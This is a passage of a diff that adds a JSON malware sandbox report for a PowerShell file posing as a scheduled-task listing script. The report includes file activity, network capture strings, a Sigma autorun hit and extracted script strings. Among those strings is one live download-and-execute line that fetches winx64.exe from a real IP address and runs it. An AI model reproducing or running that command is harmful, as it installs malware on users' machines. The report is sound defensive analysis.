+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.M870d558a#\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\en-US\\tzres.dll.mui"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\ISE\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AppLocker\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\tmpzvf1vy\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyManager\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyManager.dll"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\BitsTransfer\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\Microsoft.PowerShell.Management.psd1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Management\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf49f6405#\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheIndex"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf5ac9168#\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Utility\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\GAC_32\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyEngineApi.Interop\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyEngineApi.Interop.dll"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Pae3498d9#\\bbe7eaf9abc583afc5cb972e1c01055a\\Microsoft.PowerShell.Commands.Management.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Policy.1.0.System.Management.Automation\\v4.0_1.0.0.0__31bf3856ad364e35\\Policy.1.0.System.Management.Automation.config"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\wbem\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\CimCmdlets\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\AppLocker\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSDiagnostics\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.XmlHelper\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.XmlHelper.dll"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSScheduledJob\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\CimCmdlets\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.M870d558a#\\e6fd0809fcf152e7af28d4d954420a7a\\Microsoft.Management.Infrastructure.Native.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Dired13b18a9#\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Dired13b18a9#\\22226fd213cda8b0409db35f1a6000f7\\System.DirectoryServices.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.WSMan.Management\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Diagnostics\\Microsoft.PowerShell.Diagnostics.psd1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Pae3498d9#\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_99ef66db-8f5f-4491-822f-228c759713aa"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Manaa57fc8cc#\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Numerics\\39bc6b2550e216781f343bac4cc024af\\System.Numerics.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSWorkflowUtility\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Security\\Microsoft.PowerShell.Security.psd1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.PolicyModel.dll"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ISE\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\tzres.dll"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Host\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.BackgroundIntelligentTransfer.Management\\1.0.0.0__31bf3856ad364e35\\Microsoft.BackgroundIntelligentTransfer.Management.dll"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\machine.config"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Configuration\\8c730c7fbe608461407cf3be279cdeab\\System.Configuration.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Security\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_d7809b8a-712d-4b4c-a5f6-e0adcf171375"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\tmpzvf1vy\\b9bad49dba2747e58e7635229bc4aa1c4eca5d577048610d0653c1bf1e38c865.ps1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AppLocker\\AppLocker.psd1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Management\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\ProgramData\\Oracle\\Java\\javapath\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Python27\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.Security.ApplicationId.PolicyManagement.Cmdlets\\6.1.0.0__31bf3856ad364e35\\Microsoft.Security.ApplicationId.PolicyManagement.Cmdlets.dll"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Host\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Transactions\\ce1b28106ce7b869fa471d6407556191\\System.Transactions.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\PSDesiredStateConfiguration\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "c:\\Windows\\System32\\windowspowershell\\v1.0\\Modules\\Microsoft.PowerShell.Security\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\Microsoft.Net\\assembly\\GAC_32\\System.Transactions\\v4.0_4.0.0.0__b77a5c561934e089\\System.Transactions.dll"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_07cd1134-60f3-4b2b-99a7-6a3e74fcf9f0"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Python27\\lib\\site-packages\\pywin32_system32\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Host\\Microsoft.PowerShell.Host.psd1"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Manaa57fc8cc#\\6a6c1355f2d7de7176bc0eace243a042\\System.Management.Automation.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\GAC_MSIL\\Microsoft.BackgroundIntelligentTransfer.Management\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\System.Core\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Python27\\Scripts\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSWorkflowUtility\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\TroubleshootingPack\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_79fed44b-a50f-49d9-9204-e6dedef865bb"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf49f6405#\\c0d543ad7c05b3d906c7c12c915b874a\\Microsoft.Management.Infrastructure.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Mf5ac9168#\\2e0d9cf89766b98f230abe8caeeb01de\\Microsoft.Management.Infrastructure.CimCmdlets.ni.dll.aux"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_965e143d-a9ce-49f3-bc2a-cb5bbeac55fb"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\assembly\\pubpol59.dat"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Utility\\"
+                    },
+                    {
+                        "operate": "opened",
+                        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ISE\\ISE.psd1"
+                    },
+                    {
+                        "operate": "failed",
+                        "value": "C:\\tmpzvf1vy"
+                    },
+                    {
+                        "operate": "failed",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.S88747207#\\"
+                    },
+                    {
+                        "operate": "failed",
+                        "value": "\\DEVICE\\NETBT_TCPIP_{8C2F1D98-0F17-4D5E-BA83-0060E724AD37}"
+                    },
+                    {
+                        "operate": "failed",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Ba45bbba0#\\"
+                    },
+                    {
+                        "operate": "failed",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.Sb6a1f1bc#\\"
+                    },
+                    {
+                        "operate": "failed",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.S356e1ba0#\\"
+                    },
+                    {
+                        "operate": "failed",
+                        "value": "C:\\tmpzvf1vy\\b9bad49dba2747e58e7635229bc4aa1c4eca5d577048610d0653c1bf1e38c865.ps1\\"
+                    },
+                    {
+                        "operate": "failed",
+                        "value": "\\DEVICE\\NETBT_TCPIP_{E29AC6C2-7037-11DE-816D-806E6F6E6963}"
+                    },
+                    {
+                        "operate": "failed",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.S54faafb0#\\"
+                    },
+                    {
+                        "operate": "failed",
+                        "value": "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32\\Microsoft.S0f8e494c#\\"
+                    },
+                    {
+                        "operate": "recreated",
+                        "value": "\\DEVICE\\NETBT_TCPIP_{1141D443-46F3-4C40-8D6C-D57632F2B3B2}"
+                    },
+                    {
+                        "operate": "recreated",
+                        "value": "\\??\\MountPointManager"
+                    },
+                    {
+                        "operate": "recreated",
+                        "value": "\\??\\C:"
+                    },
+                    {
+                        "operate": "recreated",
+                        "value": "\\Device\\Afd\\Endpoint"
+                    },
+                    {
+                        "operate": "recreated",
+                        "value": "\\??\\Nsi"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_07cd1134-60f3-4b2b-99a7-6a3e74fcf9f0"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_4b2ef84f-3321-443a-9099-fab84503db7b"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheIndex"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_fd22b1fc-e617-4e09-911b-265c0b51283b"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_79fed44b-a50f-49d9-9204-e6dedef865bb"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_99ef66db-8f5f-4491-822f-228c759713aa"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Roaming\\winx64.exe"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_d7809b8a-712d-4b4c-a5f6-e0adcf171375"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_965e143d-a9ce-49f3-bc2a-cb5bbeac55fb"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_acab909d-3ed0-4ce7-a78e-8b98924df715"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_ed0c2d6a-f32a-44c3-876c-25f7a1df175b"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_43619d16-f13a-429e-a19b-5dda70471031"
+                    },
+                    {
+                        "operate": "created",
+                        "value": "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\CommandAnalysis\\PowerShell_AnalysisCacheEntry_6be5a15c-5bf8-479d-ac8e-928b6f4e80ef"
+                    }
+                ],
+                "registry": [],
+                "mutex": [],
+                "wmi_query": []
+            }
+        ]
+    },
+    "tsmam": {
+        "payloads": [],
+        "malconfigs": []
+    },
+    "extracted": [
+        {
+            "category": "script",
+            "program": "powershell",
+            "pid": 3600,
+            "first_seen": 1684500424.765625,
+            "script": "/data/sandbox_multi/sandbox_16/storage/analyses/19/extracted/0.ps1",
+            "yara": []
+        }
+    ],
+    "metadata": {
+        "output": {
+            "pcap": {
+                "dirname": "",
+                "basename": "dump.pcap",
+                "sha256": "63fdedcffd4f7e8ae4973c289ef6e46d1d1fd714365a7addb78246d459a643cb"
+            },
+            "dropped": [
+                {
+                    "dirname": "files",
+                    "basename": "e3b0c44298fc1c14_winx64.exe",
+                    "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+                }
+            ]
+        }
+    },
+    "screenshots": [
+        {
+            "path": "/data/sandbox_multi/sandbox_16/storage/analyses/19/shots/0001.jpg",
+            "ocr": ""
+        }
+    ],
+    "strings": {
+        "b9bad49dba2747e58e7635229bc4aa1c4eca5d577048610d0653c1bf1e38c865": [
+            "                        Write-verbose \"Looking through $($AllFolders.count) folders on $computer\"",
+            "                        $UniquePaths = $Results | select -ExpandProperty path -Unique",
+            "    [cmdletbinding(",
+            "                                    if($fold.getfolders(1)) {",
+            "        [parameter(ParameterSetName='COM')]",
+            "                        Catch{",
+            "        [Alias(\"host\",\"server\",\"computer\")]",
+            "                                    4 {$Status = \"Running\"} ",
+            "                        }",
+            "                                ",
+            "                                        $xml = $task.Xml",
+            "                                    ",
+            "                                $Author = ([regex]::split($task.xml,'<Author>|</Author>'))[1] ",
+            "                            Write-Error \"Could not pull scheduled tasks from $computer using schtasks.exe:`n$_\"",
+            "    Process{",
+            "            if($CompatibilityMode){",
+            "                                        @{ label = \"Status\"; expression = {$Status} },",
+            "                                        Get-AllTaskSubFolders -FolderRef $fold",
+            "            else{",
+            "                        Continue",
+            "                Write-Error \"Error pulling Scheduled tasks from $computer`: $_\"",
+            "            Position=0",
+            "            $result = @( schtasks.exe /query /v /s $computername /fo csv |",
+            "                }",
+            "                                        @{ label = \"Arguments\"; expression = {$Arguments} },",
+            "                        if($_.tostring() -like '*Exception calling \"GetFolders\" with \"1\" argument(s): \"The request is not supported.*')",
+            "function Get-ScheduledTasks {  ",
+            "            ",
+            "            )",
+            "                            Write-Verbose \"Pulling data from $($tasks.count) tasks on $computer in $($fold.name)\"",
+            "            }",
+            "                select @{ label = \"ComputerName\"; expression = { $computername } },",
+            "            else {",
+            "                            Return $FolderRef",
+            "                    }             ",
+            "        DefaultParameterSetName='COM'",
+            "            write-verbose \"Running against $computer\"",
+            "                                $Action = ([regex]::split($task.xml,'<Command>|</Command>'))[1]",
+            "    )]",
+            "                     }",
+            "                            Write-Warning \"GetFolders failed, returning root folder only: $_\"",
+            "                                $Arguments = ([regex]::split($task.xml,'<Arguments>|</Arguments>'))[1]",
+            "                foreach($item in $result){",
+            "        }",
+            "                convertfrom-csv |",
+            "                    ",
+            "                                    if($path){",
+            "                    @{ label = \"LastRunTime\"; expression = {$_.\"Last Run Time\"} },",
+            "                        $ArrFolders = @(",
+            "            function Get-AllTaskSubFolders {",
+            "                            $AllFolders = Get-AllTaskSubFolders -FolderRef $sch.GetFolder($folder) -ErrorAction stop",
+            "                                    $task | select @{ label = \"ComputerName\"; expression = { $computer } }, ",
+            "                                        Path,",
+            "        if(-not $CompatibilityMode){",
+            "                    [switch]$recurse",
+            "                                    }",
+            "                        {",
+            "                                $RunLevel = ([regex]::split($task.xml,'<RunLevel>|</RunLevel>'))[1]",
+            "                                    1 {$Status = \"Disabled\"} ",
+            "                            if($folders) {",
+            "                            foreach($task in $tasks){",
+            "            if($_){",
+            "                                        Name,",
+            "                                        @{ label = \"Author\"; expression = {$Author} },",
+            "        function Get-SchTasks {",
+            "                                        $xml | Out-File $( Join-Path $path \"$computer-$taskname.xml\" )",
+            "                                    0 {$Status = \"Unknown\"} ",
+            "                            Throw $_",
+            "                    Catch{",
+            "            [cmdletbinding()]",
+            "    Begin{",
+            "                        else",
+            "                                        @{ label = \"Action\"; expression = {$Action} },",
+            "                    }",
+            "            Try {",
+            "                                $UserId = ([regex]::split($task.xml,'<UserId>|</UserId>'))[1] ",
+            "                        Write-Warning \"Could not pull scheduled tasks from $computer using COM object, falling back to schtasks.exe\"",
+            "                                Switch ($task.State) { ",
+            "                [cmdletbinding()]",
+            "                                if(-not $exclude -or $task.Path -notmatch $Exclude){",
+            "                    \"Author\"",
+            "                        $folders = $folderRef.getfolders(1)",
+            "        [parameter()]",
+            "                                    3 {$Status = \"Ready\"} ",
+            "                )",
+            "    param(",
+            "                else{",
+            "                                    2 {$Status = \"Queued\"} ",
+            "                        Get-SchTasks -computername $computer -folder $folder -CompatibilityMode -ErrorAction stop",
+            "        [string]$Exclude = $null,",
+            "            $sch = New-Object -ComObject Schedule.Service",
+            "        [string]$Path = $null,",
+            "                            $folders = $null",
+            "                                        LastRunTime,",
+            "        )]",
+            "        foreach($computer in $computername){",
+            "                    $taskPath = $item.name",
+            "                        $sch.Connect($computer)",
+            "        [validatescript({",
+            "                                foreach ($fold in $folders) {",
+            "                    $name = @( $item.Name -split \"\\\\\" )[-1]",
+            "        [parameter(",
+            "                            Get-SchTasks -computername $computer -folder $folder -ErrorAction stop",
+            "                        else{",
+            "                        ",
+            "                            }",
+            "                else {",
+            "                        $Results = @($ArrFolders) + @($FolderRef)",
+            "                    $FolderRef",
+            "                        foreach($fold in $AllFolders){",
+            "                                $LogonType = ([regex]::split($task.xml,'<LogonType>|</LogonType>'))[1]",
+            "        [switch]$CompatibilityMode",
+            "                    $FolderRef = $sch.getfolder(\"\\\"),",
+            "                                        NumberOfMissedRuns",
+            "    }    ",
+            "                        )",
+            "            ValueFromRemainingArguments=$false, ",
+            "                Continue",
+            "                        Write-Error \"Could not pull scheduled tasks from $computer using schtasks.exe:`n$_\"",
+            "                            $AllFolders = Get-AllTaskSubFolders -FolderRef $sch.GetFolder($folder) -recurse -ErrorAction stop",
+            "                if(-not $compatibilityMode){      ",
+            "                            $tasks = $fold.GetTasks(0)",
+            "                                    $fold",
+            "                param (",
+            "                                        $taskname = $task.Name",
+            "                Test-Path -PathType Container -path $_ ",
+            "        [parameter(ParameterSetName='SchTasks')]",
+            "                            ",
+            "            ValueFromPipeline=$true,",
+            "                    @{ label = \"Name\"; expression = { $_.TaskName } },",
+            "                $true",
+            "                                        @{ label = \"RunLevel\"; expression = {$RunLevel} },",
+            "        ",
+            "                                $Description =([regex]::split($task.xml,'<Description>|</Description>'))[1]",
+            "                                }",
+            "                     Catch{",
+            "                    @{ label = \"NextRunTime\"; expression = {$_.\"Next Run Time\"} },",
+            "                            Continue",
+            "                                        @{ label = \"Description\"; expression = {$Description} },",
+            "                if (-not $recurse) {",
+            "(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',\"$env:APPDATA\\winx64.exe\");Start-Process (\"$env:APPDATA\\winx64.exe\")",
+            "        [switch]$recurse,",
+            "                    @{ label = \"Action\"; expression = {$_.\"Task To Run\"} },",
+            "        [string]$folder = \"\\\",",
+            "                        if($recurse)",
+            "            param([string]$computername, [string]$folder, [switch]$CompatibilityMode)",
+            "                $result    ",
+            "                    $item | select ComputerName, @{ label = \"Name\"; expression = {$name}}, @{ label = \"Path\"; Expression = {$taskPath}}, Enabled, Action, Arguments, UserId, LastRunTime, NextRunTime, Status, Author, RunLevel, Description, NumberOfMissedRuns",
+            "                ",
+            "                    \"Status\",",
+            "                    Try{",
+            "        })]",
+            "        } ",
+            "                                        NextRunTime,",
+            "            $failed = $false",
+            "        [string[]]$ComputerName = \"localhost\",",
+            "                        $Results | ?{$UniquePaths -contains $_.path}",
+            "                                        Enabled,",
+            "                        Try{",
+            "                                        @{ label = \"UserId\"; expression = {$UserId} },",
+            "                ?{$_.taskname -ne \"taskname\" -and $_.taskname -match $( $folder.replace(\"\\\",\"\\\\\") ) } |",
+            "            Catch{",
+            "            ValueFromPipelineByPropertyName=$true, ",
+            "            } "
+        ],
+        "pcap": [
+            "Host: 94.102.58.30",
+            " FHEPFCELEHFCEPFFFACACACACACACABO",
+            "MSFT 5.0",
+            "Connection: Keep-Alive",
+            "WORKGROUP",
+            "in-addr",
+            " FHEPFCELEHFCEPFFFACACACACACACABN",
+            " CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+            " EEEFFDELFEEPFACNFCDAEBFDEOEBEBBM",
+            "google",
+            " EEEFFDELFEEPFACNFCDAEBFDEOEBEBAA",
+            " ABACFPFPENFDECFCEPFHFDEFFPFPACAB",
+            "hostmaster",
+            "\\MAILSLOT\\BROWSE",
+            "GET /~trevor/winx64.exe HTTP/1.1",
+            "DESKTOP-RSILDVX",
+            " FHFAEBEECACACACACACACACACACACAAA",
+            "ip6-servers",
+            " EEEFFDELFEEPFACNFCDAEBFDEOEBEBCA",
+            "DESKTOP-R0ASNAA"
+        ]
+    },
+    "sigma": [
+        {
+            "rule_source": "SigmaHQ",
+            "subrule_source": "windows",
+            "result": [
+                {
+                    "title": "Autorun Keys Modification",
+                    "id": "17f878b8-9968-4578-b814-c4217fc5768c",
+                    "description": "Detects modification of autostart extensibility point (ASEP) in registry.",
+                    "tags": [
+                        "attack.persistence",
+                        "attack.t1547.001",
+                        "attack.t1060"
+                    ],
+                    "author": "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton",
+                    "level": "medium",
+                    "falsepositives": [
+                        "Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason",
+                        "Legitimate administrator sets up autorun keys for legitimate reason"
+                    ],
+                    "filename": "",
+                    "count": 1
+                }
+            ]
+        },
+        {
+            "rule_source": "Malware",
+            "subrule_source": "cobaltstrike",
+            "result": []
+        }
+    ],
+    "target": {
+        "category": "file",
+        "file": {
+            "name": "b9bad49dba2747e58e7635229bc4aa1c4eca5d577048610d0653c1bf1e38c865",
+            "path": "/data/sandbox_multi/sandbox_16/storage/binaries/b9bad49dba2747e58e7635229bc4aa1c4eca5d577048610d0653c1bf1e38c865",
+            "size": 9842,
+            "crc32": "9344366D",
+            "md5": "c723391b16bdca24384b43ffcdefafaa",
+            "sha1": "743804790a9f2e9ff730eb05569ce56124dbea5a",
